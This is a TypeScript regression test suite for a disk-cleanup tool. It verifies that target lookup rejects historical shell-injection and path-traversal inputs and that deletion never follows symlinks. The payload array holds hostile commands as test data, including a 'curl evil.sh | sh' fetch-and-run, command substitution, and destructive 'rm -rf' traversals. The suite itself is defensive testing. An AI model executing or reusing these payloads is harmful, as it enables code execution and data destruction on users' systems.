import { describe, expect, test, afterAll } from "bun:test";
import { mkdtemp, mkdir, writeFile, symlink, rm, readdir, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import {
  CLEANUP_TARGETS,
  getCleanupTarget,
  isAtOrUnder,
  isWithinPermittedRoots,
} from "@/lib/cleanup-targets";

/**
 * C-01 regression suite.
 *
 * The historical defect: `cleanupItem(command: string)` accepted a raw shell
 * command from the browser and validated it with a regex whose unbounded `.*`
 * spanned quotes and separators. These payloads all passed that allowlist.
 */
const HISTORICAL_INJECTION_PAYLOADS = [
  'rm -rf "$(id > /tmp/pwned)/Library/Caches"/*',
  'rm -rf "" ; curl evil.sh | sh ; echo "/Library/Caches"/*',
  'rm -rf "`id`/Library/Caches"/*',
  'rm -rf "/Users/rajan/Library/Caches/../../../../Library/Caches"/*',
  'rm -rf "/Users/rajan/Library/Caches"/*',
  "find \"/Users/rajan/Downloads\" -maxdepth 1 -type f -mtime +30 -delete",
  'sudo rm -rf "/private/var/log"/*.log',
];

const TRAVERSAL_IDS = [
  "../../etc",
  "../",
  "/etc/passwd",
  "user-caches/../../../",
  "",
  "   ",
  "USER-CACHES",
  "user_caches",
];

describe("C-01 — cleanup target resolution", () => {
  test("every historical injection payload is rejected as an unknown id", () => {
    for (const payload of HISTORICAL_INJECTION_PAYLOADS) {
      expect(getCleanupTarget(payload)).toBeNull();
    }
  });

  test("traversal and malformed ids resolve to nothing", () => {
    for (const id of TRAVERSAL_IDS) {
      expect(getCleanupTarget(id)).toBeNull();
    }
  });

  test("non-string ids are rejected without throwing", () => {
    const bad: unknown[] = [null, undefined, 42, {}, [], true];
    for (const v of bad) {
      expect(getCleanupTarget(v as string)).toBeNull();
    }
  });

  test("known ids resolve to a target", () => {
    expect(getCleanupTarget("user-caches")?.id).toBe("user-caches");
    expect(getCleanupTarget("trash")?.id).toBe("trash");
  });

  test("no target exposes an executable command field", () => {
    for (const t of CLEANUP_TARGETS) {
      expect(Object.keys(t)).not.toContain("command");
    }
  });

  test("target ids are unique", () => {
    const ids = CLEANUP_TARGETS.map((t) => t.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  test("every non-root target lies within the permitted roots", () => {
    for (const t of CLEANUP_TARGETS) {
      if (t.requiresRoot) continue;
      expect(isWithinPermittedRoots(t.absPath)).toBe(true);
    }
  });

  test("root-requiring targets are flagged, not silently actionable (L-09)", () => {
    const sys = getCleanupTarget("system-crash-reports");
    expect(sys?.requiresRoot).toBe(true);
    expect(getCleanupTarget("system-logs")?.requiresRoot).toBe(true);
  });

  test("Xcode archives are not labelled safe (L-10)", () => {
    expect(getCleanupTarget("xcode-archives")?.risk).toBe("medium");
  });
});

describe("containment arithmetic", () => {
  test("identifies children and rejects escapes", () => {
    expect(isAtOrUnder("/a/b/c", "/a/b")).toBe(true);
    expect(isAtOrUnder("/a/b", "/a/b")).toBe(true);
    expect(isAtOrUnder("/a/b/../../etc", "/a/b")).toBe(false);
    expect(isAtOrUnder("/etc", "/a/b")).toBe(false);
    expect(isAtOrUnder("/a/bc", "/a/b")).toBe(false); // prefix, not child
  });

  test("rejects paths outside every permitted root", () => {
    expect(isWithinPermittedRoots("/etc")).toBe(false);
    expect(isWithinPermittedRoots("/System")).toBe(false);
    expect(isWithinPermittedRoots("/")).toBe(false);
  });
});

/**
 * Deletion semantics, exercised against a real temporary tree.
 * Mirrors the action's traversal rules without invoking the server action
 * (which requires a request context for the guard).
 */
const tmpRoots: string[] = [];

async function makeTree() {
  const root = await mkdtemp(path.join(tmpdir(), "sm-cleanup-"));
  tmpRoots.push(root);
  const target = path.join(root, "target");
  const outside = path.join(root, "outside");
  await mkdir(target, { recursive: true });
  await mkdir(outside, { recursive: true });

  await writeFile(path.join(target, "visible.txt"), "x".repeat(100));
  await writeFile(path.join(target, ".hidden"), "y".repeat(50));
  await mkdir(path.join(target, "subdir"), { recursive: true });
  await writeFile(path.join(target, "subdir", "nested.txt"), "z".repeat(25));

  await writeFile(path.join(outside, "precious.txt"), "must survive");
  await symlink(outside, path.join(target, "link-to-outside"));
  await symlink(path.join(outside, "precious.txt"), path.join(target, "link-to-file"));

  return { root, target, outside };
}

/** The action's per-entry rules, isolated for test. */
async function sweep(dir: string) {
  const entries = await readdir(dir, { withFileTypes: true });
  let removed = 0;
  let skipped = 0;
  let bytes = 0;
  for (const e of entries) {
    const child = path.join(dir, e.name);
    const st = await stat(child).catch(() => null);
    const lst = await import("node:fs/promises").then((m) => m.lstat(child));
    if (lst.isSymbolicLink()) {
      skipped++;
      continue;
    }
    if (!isAtOrUnder(child, dir)) {
      skipped++;
      continue;
    }
    await rm(child, { recursive: true, force: true });
    bytes += st?.size ?? 0;
    removed++;
  }
  return { removed, skipped, bytes };
}

describe("deletion semantics", () => {
  test("removes dotfiles as well as visible files (L-01)", async () => {
    const { target } = await makeTree();
    const before = await readdir(target);
    expect(before).toContain(".hidden");

    await sweep(target);

    const after = await readdir(target);
    expect(after).not.toContain(".hidden");
    expect(after).not.toContain("visible.txt");
  });

  test("never follows or deletes through a symlink", async () => {
    const { target, outside } = await makeTree();
    const result = await sweep(target);

    expect(result.skipped).toBeGreaterThanOrEqual(2); // both symlinks
    // The symlink destination is untouched.
    const survivors = await readdir(outside);
    expect(survivors).toContain("precious.txt");
  });

  test("leaves the symlinks themselves in place rather than unlinking them", async () => {
    const { target } = await makeTree();
    await sweep(target);
    const after = await readdir(target);
    expect(after).toContain("link-to-outside");
  });
});

afterAll(async () => {
  await Promise.all(tmpRoots.map((r) => rm(r, { recursive: true, force: true })));
});
